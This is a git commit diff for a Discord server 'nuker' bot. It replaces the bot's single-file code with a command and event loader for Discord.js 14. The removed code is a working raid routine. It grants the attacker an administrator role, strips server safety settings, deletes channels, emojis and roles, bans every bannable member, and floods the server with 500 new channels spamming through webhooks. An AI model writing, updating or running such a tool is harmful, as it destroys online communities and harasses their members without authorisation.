56d2c279164ab38bbecd94fdb3e00795fe1cfaa2
R <67007753+badb000m@users.noreply.github.com>
2023-04-29 22:31:43 +0100

    Add files via upload
    Updated to Discord.js 14

--- index.js
+++ index.js
@@ -1,81 +1,35 @@
-const Configuration = require("./Config.json");
-const { Client } = require("discord.js");
+const config = require("./config.json");
 
-let NukerBot = new Client();
+const {Client, Collection, IntentsBitField, ActivityType} = require("discord.js");
 
-NukerBot.once("ready", () => {
-    for (const guild of NukerBot.guilds.cache.array()) {
-        console.log(`Guild: ${guild.name}: ${guild.id}: ${guild.members.cache.size}`);
+const fs = require("fs");
+
+const intents = new IntentsBitField([3276799]);
+
+let nukerBot = new Client({intents: intents});
+
+nukerBot.commands = new Collection();
+
+const commandFiles = fs.readdirSync("./commands/").filter(file => file.endsWith(".js"));
+const eventFiles = fs.readdirSync("./events/").filter(file => file.endsWith(".js"));
+
+for (const file of commandFiles) {
+    const command = require(`./commands/${file}`);
+    nukerBot.commands.set(command.name, command);
+
+    console.log(`Set ${file}`);
+}
+
+
+for (const file of eventFiles) {
+    const event = require(`./events/${file}`);
+    if (event.once) {
+        nukerBot.once(event.name, (...args) => event.execute(...args, nukerBot));
+    } else {
+        nukerBot.on(event.name, (...args) => event.execute(...args, nukerBot));
     }
-});
+}
 
-NukerBot.on("message", async message => {
-    if (!message.content.startsWith(Configuration.prefix)) return;
-    let arguments = message.content.slice(Configuration.prefix.length).trim().split(/ +/g);
-    let command = arguments.shift().toLowerCase();
-    //Only using a if/else chain due to my laziness. (It's only one command so I don't see the point of a command handler)
-    if (command === "nuke") {
-        const guild = NukerBot.guilds.cache.get(arguments[0]);
-        await guild.setIcon(Configuration.icon).then(async guild => {
-            //Sets the recommended raid options. (Believe me, I'm only using an if/else case due to how slow switch/case is. It's just not suitable for this).
-            if (guild.verificationLevel !== "NONE") {
-                guild.setVerificationLevel("NONE");
-            } else if (guild.region !== Configuration.region) {
-                guild.setRegion(Configuration.region);
-            } else if (guild.defaultMessageNotifications !== "ALL") {
-                guild.setDefaultMessageNotifications("ALL");
-            } else if (guild.explicitContentFilter !== "DISABLED") {
-                guild.setExplicitContentFilter("DISABLED");
-            } else if (guild.premiumTier >= 15) {
-                guild.setBanner(Configuration.icon);
-            } else {
-                //Leave this empty to pass
-            }
-            guild.roles.create({
-                data: {
-                    name: Configuration.name,
-                    permissions: 8,
-                    color: "#36383F",
-                    hoist: true
-                }
-            }).then(role => {
-                guild.member(message.author).roles.add(role);
-            });
-            //Filters deletable channels, deletes them right after
-            for (const channel of guild.channels.cache.filter(channel => channel.deletable).array()) {
-                channel.delete();
-            }
-            //Filters deletable emojis, deletes them right after
-            for (const emoji of guild.emojis.cache.filter(emoji => emoji.deletable).array()) {
-                emoji.delete();
-            }
-            //Filters deletable roles, deletes them right after
-            for (const role of guild.roles.cache.filter(role => {
-                role.editable && role.name === Configuration.name
-            }).array()) {
-                role.delete();
-            }
-            //Filters bannable members, bans them right after
-            for (const member of guild.members.cache.filter(member => member.bannable).array()) {
-                member.ban();
-            }
-            //Repeat this process until maximum channel limit is reached
-            for (let i = 0; i < 500; i++) {
-                guild.channels.create(Configuration.name, {
-                    type: "text"
-                }).then(channel => {
-                    channel.createWebhook(Configuration.name, {
-                        avatar: Configuration.icon
-                    }).then(async webhook => {
-                        setInterval(() => {
-                            channel.send(Configuration.nuke_message);
-                            webhook.send(Configuration.nuke_message);
-                        });
-                    });
-                });
-            }
-        });
-    }
+nukerBot.login(config.token).then(() => {
+    console.log('Successfully logged in!');
 });
-
-NukerBot.login(Configuration.token);
